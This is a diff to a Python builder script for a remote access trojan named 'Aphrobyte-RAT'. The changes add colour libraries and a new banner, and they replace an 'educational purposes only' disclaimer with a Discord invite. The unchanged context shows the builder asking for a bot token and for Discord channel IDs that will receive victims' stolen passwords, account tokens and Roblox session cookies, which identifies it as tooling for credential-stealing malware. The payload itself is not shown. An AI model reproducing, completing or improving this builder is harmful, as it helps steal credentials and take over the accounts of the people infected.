@@ -2,11 +2,16 @@ import sys, os, shutil
 try:
     from termcolor import colored
     import colorama
+    from colorama import Fore
+    from pystyle import Colors, Colorate, Center
 except:
     os.system("pip install termcolor")
     os.system("pip install colorama")
+    os.system("pip install pystyle")
     from termcolor import colored
     import colorama
+    from colorama import Fore
+    from pystyle import Colors, Colorate, Center
 
 colorama.init()
 
@@ -50,8 +55,9 @@ def pause():
     os.system("pause")  
 def clear():
     os.system("cls")    
-    
-ascii_art = """
+
+def printart():
+    ascii_art = """
 
 ░█████╗░██████╗░██╗░░██╗██████╗░░█████╗░██████╗░██╗░░░██╗████████╗███████╗
 ██╔══██╗██╔══██╗██║░░██║██╔══██╗██╔══██╗██╔══██╗╚██╗░██╔╝╚══██╔══╝██╔════╝
@@ -59,10 +65,19 @@ ascii_art = """
 ██╔══██║██╔═══╝░██╔══██║██╔══██╗██║░░██║██╔══██╗░░╚██╔╝░░░░░██║░░░██╔══╝░░
 ██║░░██║██║░░░░░██║░░██║██║░░██║╚█████╔╝██████╦╝░░░██║░░░░░░██║░░░███████╗
 ╚═╝░░╚═╝╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░░░░╚═╝░░░╚══════╝
-
-This tool has been made for educational purposes only. I am not responsible for any misuse of this tool.
-Made by RIOT Administration | v1.9.2
 """ 
+
+    creds = """
+    ╔═══════════════════════════════════════╗
+    ╬ Created by RIOT Administration        ╬
+    ╬ Invite: https://discord.gg/4TyqkDXtBa ╬
+    ╚═══════════════════════════════════════╝
+    """
+
+    print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(ascii_art)))
+    print(Colorate.Vertical(Colors.blue_to_purple, Center.XCenter(creds)))
+
+
 clear()
 os.system("""title "Aphrobyte-RAT Builder | Warning | Unlicensed"
 """)
@@ -72,8 +87,7 @@ pause()
 clear()
 os.system("""title "Aphrobyte-RAT Builder | Configuration | Unlicensed"
 """)
-print(colored(ascii_art, 'white'))
-print(colored("-"*75,'red'))
+printart()
 print("")   
 token = input("Bot token : ")
 guildid = input("Server ID : ")
@@ -83,16 +97,16 @@ tokens = input("Tokens channel ID to receive tokens : ")
 roblosecurity = input("Roblosecurity channel ID to receive Roblox cookies : ")  
 print("")
 clear()
-print(colored(f"""
-Bot token : {token}
-Guild ID : {guildid}
-Notifications channel ID : {annc}
-Passwords channel ID : {passw}
-Tokens channel ID : {tokens}
-Roblosecurity channel ID : {roblosecurity}
+print(f"""
+{Fore.BLUE}Bot token : {token}
+{Fore.BLUE}Guild ID : {guildid}
+{Fore.BLUE}Notifications channel ID : {annc}
+{Fore.BLUE}Passwords channel ID : {passw}
+{Fore.BLUE}Tokens channel ID : {tokens}
+{Fore.BLUE}Roblosecurity channel ID : {roblosecurity}
 
-""", 'green'))
-prompt = input("Is this correct? (y/n)")
+""")
+prompt = input(f"{Fore.BLUE}Is this correct? (y/n)")
 if prompt.lower() == "y":
     pass
 elif prompt.lower() == "n":
